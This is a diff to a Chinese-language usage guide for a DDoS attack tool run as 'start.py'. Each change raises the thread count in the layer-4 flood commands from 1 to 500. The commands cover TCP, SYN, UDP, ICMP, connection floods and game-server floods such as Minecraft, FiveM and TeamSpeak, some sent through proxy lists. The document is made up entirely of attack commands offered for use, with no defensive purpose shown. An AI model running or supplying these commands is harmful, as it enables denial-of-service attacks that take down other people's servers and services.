@@ -86,32 +86,32 @@
 
 #### ddos-layer4（代理）代理文件位置/root/files/proxies/
 
-	python3 start.py TCP ip:port 1 120 0 all.txt
+	python3 start.py TCP ip:port 500 120 0 all.txt
 
-	python3 start.py CPS ip:port 1 120 0 all.txt
+	python3 start.py CPS ip:port 500 120 0 all.txt
 
-	python3 start.py CONNECTION ip:port 1 120 0 all.txt
+	python3 start.py CONNECTION ip:port 500 120 0 all.txt
 
-	python3 start.py MCBOT ip:port 1 120 0 all.txt
+	python3 start.py MCBOT ip:port 500 120 0 all.txt
 
-	python3 start.py MINECRAFT ip:port 1 120 0 all.txt
+	python3 start.py MINECRAFT ip:port 500 120 0 all.txt
 
  
 #### ddos-layer4（普通）
 
-	python3 start.py UDP ip:port 1 120
+	python3 start.py UDP ip:port 500 120
 
-	python3 start.py SYN ip:port 1 120
+	python3 start.py SYN ip:port 500 120
 
-	python3 start.py ICMP ip:port 1 120
+	python3 start.py ICMP ip:port 500 120
 
-	python3 start.py VSE ip:port 1 120
+	python3 start.py VSE ip:port 500 120
 
-	python3 start.py TS3 ip:port 1 120
+	python3 start.py TS3 ip:port 500 120
 
-	python3 start.py FIVEM ip:port 1 120
+	python3 start.py FIVEM ip:port 500 120
 
-	python3 start.py MCPE ip:port 1 120
+	python3 start.py MCPE ip:port 500 120
 
 
 
